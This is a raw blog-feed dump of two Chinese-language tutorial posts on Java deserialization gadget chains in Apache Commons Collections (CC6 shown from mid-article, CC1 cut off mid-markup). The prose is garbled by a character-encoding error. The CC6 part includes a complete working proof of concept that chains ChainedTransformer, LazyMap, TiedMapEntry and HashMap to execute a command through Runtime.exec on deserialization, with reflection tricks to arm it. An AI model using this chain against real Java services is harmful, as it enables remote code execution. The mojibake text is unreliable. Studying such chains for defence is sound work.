class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hash</span><span class="hljs-params">(Object key)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> h;<br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-keyword">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>    ...<br>    <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>      <br>          K key = (K) s.readObject();<br>      <br>          V value = (V) s.readObject();<br>      putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">false</span>);<br>    &#125;<br>  &#125;<br>  ...<br>  <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>    ...<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>      <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>          K key = (K) s.readObject();<br>      <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>          V value = (V) s.readObject();<br>      putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">false</span>);<br>    &#125;<br>  &#125;<br>&#125;<br>æœ‰è¿‡URLDNSé“¾çš„åŸºç¡€ï¼Œè¿™é‡Œå°±å‡ ä¹å¾ˆæ¸…æ™°äº†<br></code></pre></td></tr></table></figure>æ­£å‘æ‹æ‹æ€è·¯</li><li>HashMap#readObject() â€”&gt; hash(key)</li><li>HashMap#hash() â€“&gt; key.hashCode()   keyå¯æ§ï¼Œå½“keyæ˜¯ä¸€ä¸ªTiedMapEntryæ—¶</li><li>TiedMapEntry#hashCode() â€“&gt; getValue()</li><li>TiedMapEntry#getValue() â€“&gt; map.get(key) mapå¯æ§ï¼Œå½“mapæ˜¯ä¸€ä¸ªLazyMapæ—¶</li><li>LazyMap#get() â€”&gt; ChainedTransformer#transform()<br>æ€è·¯æ‹æ¸…æ¥šäº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ¥çœ‹é—®é¢˜äº†<h4 id="é—®é¢˜1"><a href="#é—®é¢˜1" class="headerlink" title="é—®é¢˜1"></a>é—®é¢˜1</h4>åœ¨å‘HashMapä¸­ä¼ å€¼çš„æ—¶å€™ï¼Œä¼šç”¨åˆ°HashMap#put()<br><img src="/2022/10/01/CommonsCollections6/cc6_4.png"><br>è¿™ä¹Ÿä¼šå¯¼è‡´è°ƒç”¨åˆ°key.hashCode(),ä»è€Œå¯¼è‡´å…ˆç”ŸæˆPOCçš„æ—¶å€™ä¹Ÿä¼šæ‰§è¡Œä»£ç <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> V <span class="hljs-title">put</span><span class="hljs-params">(K key, V value)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">true</span>);<br>&#125;<br></code></pre></td></tr></table></figure>è§£å†³æ–¹æ³•å°±æ˜¯,å¯ä»¥å…ˆåœ¨LazyMapã€TiedMapEntryã€HashMapä¸­ä¼ å…¥æ²¡æœ‰æ‰§è¡Œä»£ç çš„Transformerã€LazyMapã€TiedMapEntry<br>ç„¶åå†putç»“æŸåé€šè¿‡åå°„å»ä¿®æ”¹å…¶ä¸­çš„å€¼<h4 id="é—®é¢˜2"><a href="#é—®é¢˜2" class="headerlink" title="é—®é¢˜2"></a>é—®é¢˜2</h4>è¿˜æ˜¯HashMap#put()ï¼Œåœ¨ç”ŸæˆPOCçš„æ—¶å€™<br><code>HashMap#put ---&gt; HashMap#hash ---&gt; TiedMapEntry#hashCode ---&gt; TiedMapEntry#getValue ---&gt;LazyMap#get</code><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">get</span><span class="hljs-params">(Object key)</span> </span>&#123;<br>    <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-keyword">false</span>) &#123;  <span class="hljs-comment">// ç”Ÿæˆæ—¶ï¼Œmapä¸­ä¸åŒ…å«key,è¿›å…¥if</span><br>        Object value = factory.transform(key);<br>        map.put(key, value);    <span class="hljs-comment">// ä¼ å…¥K,V   æ­¤æ—¶mapä¸­å·²ç»åŒ…å«keyäº†</span><br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2022/10/01/CommonsCollections6/cc6_5.png"></li></ul><p><img src="/2022/10/01/CommonsCollections6/cc6_6.png"><br>æ‰€ä»¥å°±éœ€è¦åœ¨ï¼Œputç»“æŸä¹‹åï¼Œå°†é”®å€¼å¯¹åˆ é™¤ï¼Œä¹Ÿå°±æ˜¯ä¿è¯åœ¨ååºåˆ—åŒ–çš„æ—¶å€™èƒ½å¤ŸæˆåŠŸè¿›å…¥ifä¸­<br>OKï¼Œå¼€å§‹å†™POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6Test</span> </span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String path = <span class="hljs-string">&quot;ser.bin&quot;</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>    ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>      <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>      <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>      <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;Runtime.class,<span class="hljs-keyword">null</span>&#125;),<br>      <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>    &#125;);<br><br>    HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    Map lazyMap = LazyMap.decorate(map,<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-string">&quot;q&quot;</span>));<br><br>    TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(lazyMap, <span class="hljs-string">&quot;111&quot;</span>);<br><br>    HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;222&quot;</span>);<br>    lazyMap.remove(<span class="hljs-string">&quot;111&quot;</span>);<br><br>    Class aClass = LazyMap.class;<br>    Field factory = aClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>    factory.setAccessible(<span class="hljs-keyword">true</span>);<br>    factory.set(lazyMap,chainedTransformer);<br><br><span class="hljs-comment">//    serialize(hashMap);</span><br>    deserialize();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="0x02-å‘ç‚¹"><a href="#0x02-å‘ç‚¹" class="headerlink" title="0x02 å‘ç‚¹"></a>0x02 å‘ç‚¹</h3><h4 id="å‘ç‚¹1"><a href="#å‘ç‚¹1" class="headerlink" title="å‘ç‚¹1"></a>å‘ç‚¹1</h4><p>è¿™ä¸ªå‘ç‚¹å°±æ˜¯ä¸‡æ¶çš„IDEAäº†ï¼ŒçœŸä»–å–µçš„æœäº†ï¼Œä»¥å‰å¤šå¼¹å‡ ä¸ªè®¡ç®—å™¨æˆ‘éƒ½æ²¡ç®¡å®ƒï¼Œä»Šå¤©ç›´æ¥ä»£ç æµç¨‹éƒ½ç»™æˆ‘å˜äº†ï¼Œæˆ‘çœŸæ˜¯è‰¹äº†<br>è¿™ä¸ªé—®é¢˜æ˜¯IDEAåœ¨debugæ¨¡å¼ä¸‹ï¼Œé»˜è®¤çš„æ—¶å€™ä¼šå¯ç”¨ <strong>è‡ªåŠ¨tostring</strong>å’Œ<strong>å±•ç¤ºé›†åˆå¯¹è±¡</strong><br><img src="/2022/10/01/CommonsCollections6/cc6_10.png"><br>åœ¨è°ƒè¯•çš„æ—¶å€™éœ€è¦è¿™æ¡é“¾çš„æ—¶å€™éœ€è¦æŠŠè¿™ä¸¤é¡¹å…³äº†ï¼Œå…³äº†å°±ä¸‡äº‹å¤§å‰äº†</p><h3 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03 æ€»ç»“"></a>0x03 æ€»ç»“</h3><p>è™½ç„¶æ˜¯å¤šå°‘å¹´å‰çš„ä¸œè¥¿äº†ï¼Œä½†è¿˜æ˜¯è¦å­¦ä¹ å­¦ä¹ çœ‹ä¸€ä¸‹çš„ï¼Œè¿˜æ˜¯èƒ½å¤Ÿå­¦åˆ°ä¸å°‘ä¸œè¥¿ï¼ï¼ï¼<br>åˆ‡ä¸å¯æ‹¿åˆ°åˆ«äººä¸œè¥¿ç›´æ¥ç”¨ï¼ï¼ï¼<br>å†æ¥æä¸€å˜´ï¼Œè¿™æ¡é“¾çš„å¥½ç”¨åœ¨å“ªï¼Œå› ä¸ºå¯¹JDKç‰ˆæœ¬æ²¡æœ‰é™åˆ¶ï¼Œæ”¾ä¸¤å¼ å›¾<br><img src="/2022/10/01/CommonsCollections6/cc6_7.png"></p><p><img src="/2022/10/01/CommonsCollections6/cc6_8.png"><br>æœ€åå†æ¥çœ‹ä¸€ä¸‹å½“å‰æ‰€æœ‰çš„é“¾<br><img src="/2022/10/01/CommonsCollections6/cc6_9.png"></p><h3 id="0x04-å‚è€ƒé“¾æ¥"><a href="#0x04-å‚è€ƒé“¾æ¥" class="headerlink" title="0x04 å‚è€ƒé“¾æ¥"></a>0x04 å‚è€ƒé“¾æ¥</h3><ul><li><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java">ysoserial_CommonsCollections6</a></li><li><a href="https://www.bilibili.com/video/BV1yP4y1p7N7/?spm_id_from=333.788&vd_source=db93b94230228cb739b48f4f59e74abd">Javaååºåˆ—åŒ–CommonsCollectionsç¯‡(äºŒ)-æœ€å¥½ç”¨çš„CCé“¾</a></li><li><a href="https://blog.csdn.net/lkforce/article/details/90479650">å…³äºIDEAåœ¨debugæ—¶ç§è‡ªè°ƒç”¨toString()æ–¹æ³•çš„é—®é¢˜</a></li><li><a href="https://blog.csdn.net/weixin_43263451/article/details/125993445">å…³äºcc1/cc3 æ— æ³•åœ¨é«˜ç‰ˆæœ¬jdkä¸­åˆ©ç”¨çš„è¯´æ˜</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Javaå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsCollections1</title>
    <link href="/2022/09/24/CommonsCollections1/"/>
    <url>/2022/09/24/CommonsCollections1/</url>
    
    <content type="html"><![CDATA[<h2 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h2><h3 id="0x00-CommonsCollectionsç®€ä»‹"><a href="#0x00-CommonsCollectionsç®€ä»‹" class="headerlink" title="0x00 CommonsCollectionsç®€ä»‹"></a>0x00 CommonsCollectionsç®€ä»‹</h3><p>æ˜¯ JDK 1.2 ä¸­çš„ä¸»è¦è¡¥å……ã€‚ å®ƒæ·»åŠ äº†è®¸å¤šå¼ºå¤§çš„æ•°æ®ç»“æ„ï¼ŒåŠ é€Ÿäº†æœ€é‡è¦çš„Javaåº”ç”¨ç¨‹åºçš„å¼€å‘ã€‚<br>Commons-Collectionsè¯•å›¾é€šè¿‡æä¾›æ–°çš„æ¥å£ã€å®ç°å’Œå®ç”¨ç¨‹åºæ¥æ„å»ºJDKç±»ã€‚</p><ul><li>åŒ…æ¥å£ï¼Œç”¨äºå…·æœ‰æ¯ä¸ªå¯¹è±¡å¤šä¸ªå‰¯æœ¬çš„é›†åˆ</li><li>åŒå‘æ˜ å°„æ¥å£ï¼Œç”¨äºå¯ä»¥ä»å€¼åˆ°é”®ä»¥åŠé”®åˆ°å€¼æŸ¥æ‰¾çš„æ˜ å°„</li><li>åœ°å›¾è¿­ä»£å™¨ç•Œé¢ï¼Œæä¾›ç®€å•å¿«é€Ÿçš„åœ°å›¾è¿­ä»£</li><li>è½¬æ¢ä¿®é¥°å™¨ï¼Œåœ¨å°†æ¯ä¸ªå¯¹è±¡æ·»åŠ åˆ°é›†åˆæ—¶å¯¹å…¶è¿›è¡Œæ›´æ”¹</li><li>ä½¿å¤šä¸ªé›†åˆçœ‹èµ·æ¥åƒä¸€ä¸ªé›†åˆçš„å¤åˆé›†åˆ</li><li>æ·»åŠ ä¿ç•™é¡ºåºå…ƒç´ çš„æœ‰åºæ˜ å°„å’Œé›†ï¼ŒåŒ…æ‹¬åŸºäº LRU çš„æ˜ å°„</li><li>å…è®¸åœ¨ä¸¥å¯†æ§åˆ¶ä¸‹å¯¹é”®å’Œ/æˆ–å€¼è¿›è¡Œåƒåœ¾å›æ”¶çš„å‚è€ƒæ˜ å°„</li><li>å¤šç§æ¯”è¾ƒå™¨å®ç°</li><li>è®¸å¤šè¿­ä»£å™¨å®ç°</li><li>ä»æ•°ç»„å’Œæšä¸¾åˆ°é›†åˆçš„é€‚é…å™¨ç±»</li><li>ç”¨äºæµ‹è¯•æˆ–åˆ›å»ºé›†åˆçš„å…¸å‹é›†åˆè®ºå±æ€§ï¼ˆå¦‚å¹¶é›†ã€äº¤é›†å’Œé—­åŒ…ï¼‰çš„å®ç”¨ç¨‹åº<h4 id="æœ¬æ–‡ç¯å¢ƒ"><a href="#æœ¬æ–‡ç¯å¢ƒ" class="headerlink" title="æœ¬æ–‡ç¯å¢ƒ"></a>æœ¬æ–‡ç¯å¢ƒ</h4></li><li>jdk8u65</li><li>commons-collections 3.2.1<h3 id="0x01-CommonsCollections1åˆ†æ"><a href="#0x01-CommonsCollections1åˆ†æ" class="headerlink" title="0x01 CommonsCollections1åˆ†æ"></a>0x01 CommonsCollections1åˆ†æ</h3>å…ˆæ¥è†œæ‹œä¸€ä¸‹å·¨ä½¬çš„ysoserialä¸­cc1çš„payload<br><img src="/2022/09/24/CommonsCollections1/cc1_1.png"><br><img src="/2022/09/24/CommonsCollections1/cc1_2.png"><h4 id="å±é™©æ–¹æ³•"><a href="#å±é™©æ–¹æ³•" class="headerlink" title="å±é™©æ–¹æ³•"></a>å±é™©æ–¹æ³•</h4>å±é™©æ–¹æ³•ç›®å‰è¿˜æ˜¯ä¸çŸ¥é“è¯¥æ€ä¹ˆå»å¯»æ‰¾ï¼ŒçŒœæµ‹åº”è¯¥ä¸æ˜¯ä¸€ä¸ªä¸€ä¸ªæ–¹æ³•å»çœ‹ï¼Œæ‰€ä»¥æ­¤å¤„å°±ä¸è¯´å…³äºå±é™©æ–¹æ³•å¯»æ‰¾çš„äº‹æƒ…äº†(å…¶å®æ˜¯ä¸ä¼š):anguished:<br>ç›´æ¥æ¥åˆ°<code>org.apache.commons.collections.functors.InvokerTransformer</code><br>çœ‹ä¸€ä¸‹æ„é€ å™¨å’Œ<code>onstructor</code><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;<br>      <span class="hljs-keyword">super</span>();<br>      iMethodName = methodName;<br>      iParamTypes = paramTypes;<br>      iArgs = args;<br>  &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// è·Ÿåå°„ä¸€æ ·ï¼Œå¹¶ä¸”ç›¸å…³å˜é‡éƒ½å¯æ§ï¼Œä¹Ÿå°±æ˜¯ä»»æ„æ–¹æ³•è°ƒç”¨</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>&#123;<br>      <span class="hljs-keyword">if</span> (input == <span class="hljs-keyword">null</span>) &#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>      &#125;<br>      <span class="hljs-keyword">try</span> &#123;<br>          Class cls = input.getClass();<br>          Method method = cls.getMethod(iMethodName, iParamTypes);<br>          <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br>              <br>      ...<br>  &#125;<br></code></pre></td></tr></table></figure>æ­¤å¤„æ˜¯ä¸€ä¸ªä»»æ„æ–¹æ³•è°ƒç”¨ï¼Œç”¨è¯¥æ–¹æ³•æ‰§è¡Œä¸‹å‘½ä»¤è¯•ä¸‹<br><img src="/2022/09/24/CommonsCollections1/cc1_3.png"><br>OKï¼ï¼<code>InvokerTransformer#transform</code>ä¸€ä¸ªå®Œç¾çš„å±é™©æ–¹æ³•</li></ul><h4 id="è°ƒç”¨é“¾1"><a href="#è°ƒç”¨é“¾1" class="headerlink" title="è°ƒç”¨é“¾1"></a>è°ƒç”¨é“¾1</h4><p>åœ¨æ‰¾åˆ©ç”¨é“¾çš„è¿‡ç¨‹ä¸­ï¼Œéœ€è¦æ³¨æ„ä¸€ä¸‹å‡ ç‚¹ï¼š</p><ul><li>æ‰¾ä¸åŒåç§°æ–¹æ³•ä¸­çš„è°ƒç”¨(è¦ä¸ç„¶ä¸å®¹æ˜“çš„æ‰¾åˆ°readObjectæ–¹æ³•ä¸­)ï¼Œæ–¹æ³•åç§°å°½é‡ç®€å•</li><li>å°½é‡æ‰¾publicçš„ç±»å’Œæ–¹æ³•(æ–¹ä¾¿)</li><li>æœ€å¥½æ˜¯jdkè‡ªå¸¦,å…¶æ¬¡æ˜¯å½“å‰jaråŒ…ä¸­çš„,æœ€åæ˜¯å…¶ä»–jaråŒ…çš„</li><li>èƒ½ä¸€æ­¥åˆ°readObjectæœ€å¥½</li><li>å‚æ•°ç±»å‹å°½é‡å®½æ³›ï¼Œæœ€å¥½æ˜¯Object<br>æ‰¾åˆ°å±é™©æ–¹æ³•åå°±æ˜¯è¦æ‰¾è°ƒç”¨é“¾äº†ï¼Œå»çœ‹ä¸€ä¸‹åœ¨å“ªé‡Œè°ƒç”¨äº†è¯¥æ–¹æ³•ï¼Œç›´æ¥åœ¨IDEAä¸­ctrl+F7<br><code>org.apache.commons.collections.map.TransformedMap#checkSetValue</code><br><img src="/2022/09/24/CommonsCollections1/cc1_4.png"><code>org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValue</code><br><img src="/2022/09/24/CommonsCollections1/cc1_5.png"><code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code><br><img src="/2022/09/24/CommonsCollections1/cc1_6.png">æ¥çœ‹ä¸€ä¸‹è¿™æ¡é“¾<br><img src="/2022/09/24/CommonsCollections1/cc1_7.png"><br>æƒ³ä¸€ä¸‹ï¼šç¬¬ä¸€æ¬¡æ‰¾åˆ°è¿™æ¡é“¾çš„äººæ˜¯æ€ä¹ˆæ‰¾åˆ°ï¼Œä»¥ä¸‹æ˜¯ä¸€ç§çŒœæµ‹</li><li>å…ˆæ ¹æ®æ„Ÿè§‰å…ˆæ‰¾ä¸€æ¡</li><li>ä¸€æ­¥æ­¥æµ‹è¯•ä¸€ä¸‹èƒ½å¦æœ€ç»ˆåˆ©ç”¨</li><li>æˆåŠŸï¼Œåˆ™ä¸‡äº‹å¤§å‰ï¼Œå¤±è´¥åˆ™çœ‹ä¸€ä¸‹æ˜¯ä»å“ªé‡Œæ–­äº†ï¼Œç„¶åä»æ–­çš„ä½ç½®ç»§ç»­å‘ä¸Š<br>OK,ä¸Šé¢è¿™ä¸ªï¼Œæ˜¯å·²ç»æˆåŠŸçš„é“¾ï¼Œè¿™é‡Œæ¥çœ‹ä¸€ä¸‹è¯¥é“¾å¦‚ä½•ä¸€æ­¥æ­¥åˆ©ç”¨<h5 id="checkSetValue"><a href="#checkSetValue" class="headerlink" title="checkSetValue"></a>checkSetValue</h5>org.apache.commons.collections.map.TransformedMapä¸­é‡è¦çš„å±æ€§å’Œæ–¹æ³•å¦‚ä¸‹:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TransformedMap</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractInputCheckedMapDecorator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span></span>&#123;<br>  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer keyTransformer;   <span class="hljs-comment">// å±æ€§å¯æ§</span><br>  <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer valueTransformer; <span class="hljs-comment">// å±æ€§å¯æ§</span><br>  ...<br>  <span class="hljs-comment">// è·å–TransformedMapå¯¹è±¡çš„æ–¹æ³•</span><br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);<br>  &#125;<br>  ...<br>  <span class="hljs-function"><span class="hljs-keyword">protected</span> Object <span class="hljs-title">checkSetValue</span><span class="hljs-params">(Object value)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> valueTransformer.transform(value);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>æµ‹è¯•ä¸€ä¸‹ï¼Œèƒ½å¤ŸæˆåŠŸå®ç°ï¼Œå½“ç„¶å…¶å®ä¹Ÿå¯ä»¥ä¸ç”¨æµ‹è¯•ï¼Œåº”è¯¥è¿™é‡Œå¾ˆæ˜æ˜¾ï¼Œä½†è€ä¸ä½æˆ‘èœğŸ˜£<br><img src="/2022/09/24/CommonsCollections1/cc1_8.png"><h5 id="setValue"><a href="#setValue" class="headerlink" title="setValue"></a>setValue</h5>ç»§ç»­å‘ä¸Šï¼Œæ¥åˆ°<code>org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValue</code><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractInputCheckedMapDecorator</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractMapDecorator</span> </span>&#123;<br>  <span class="hljs-comment">// TransformedMapæ˜¯è¯¥ç±»çš„å­ç±»</span><br>  ...<br>  <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MapEntry</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractMapEntryDecorator</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AbstractInputCheckedMapDecorator parent;<br><br>    <span class="hljs-comment">// æ„é€ å™¨æ˜¯å—ä¿æŠ¤çš„ï¼Œé‚£ä¹ˆåº”è¯¥æ˜¯åœ¨åŒåŒ…ä¸­è°ƒç”¨</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">MapEntry</span><span class="hljs-params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> </span>&#123;<br>      <span class="hljs-keyword">super</span>(entry);<br>      <span class="hljs-keyword">this</span>.parent = parent; <br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">setValue</span><span class="hljs-params">(Object value)</span> </span>&#123;  <span class="hljs-comment">// public æ¥æ”¶Objectç±»å‹çš„å‚æ•°</span><br>        value = parent.checkSetValue(value);  <span class="hljs-comment">// å¦‚æœparentæ˜¯TransformedMap,é‚£ä¹ˆå°±èƒ½èµ°åˆ°å±é™©å‡½æ•°</span><br>        <span class="hljs-keyword">return</span> entry.setValue(value);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>è¿™é‡Œéœ€è¦æ³¨æ„çš„æœ‰ä¸ªå‰ç¼€çŸ¥è¯†<a href="https://blog.csdn.net/yaomingyang/article/details/78748130">javaä¸­MapåŠMap.Entryè¯¦è§£</a><br><code>TransformedMap</code>è¯´åˆ°åº•è¿˜æ˜¯ä¸ªMap,å½“è°ƒç”¨å®ƒçš„<code>entrySet()</code>æ—¶ï¼Œç”±äº<code>TransformedMap</code>æœ¬èº«æ²¡æœ‰è¯¥æ–¹æ³•ï¼Œåˆ™ä¼šè¿›å…¥çˆ¶ç±»<code>AbstractInputCheckedMapDecorator#entrySet</code>ä¸­<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Set <span class="hljs-title">entrySet</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (isSetValueChecking()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> EntrySet(map.entrySet(), <span class="hljs-keyword">this</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> map.entrySet();  <span class="hljs-comment">// è·å–åˆ°Mapé›†åˆä¸­æ‰€æœ‰çš„é”®å€¼å¯¹å¯¹è±¡çš„é›†åˆMap.Entry</span><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Iterator <span class="hljs-title">iterator</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> EntrySetIterator(collection.iterator(), parent);<br>    &#125;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure>æ­¤æ—¶å†å»è°ƒç”¨å¾ªç¯è¯¥é›†åˆå»è°ƒç”¨setValue<br><img src="/2022/09/24/CommonsCollections1/cc1_10.png"><h5 id="readObject"><a 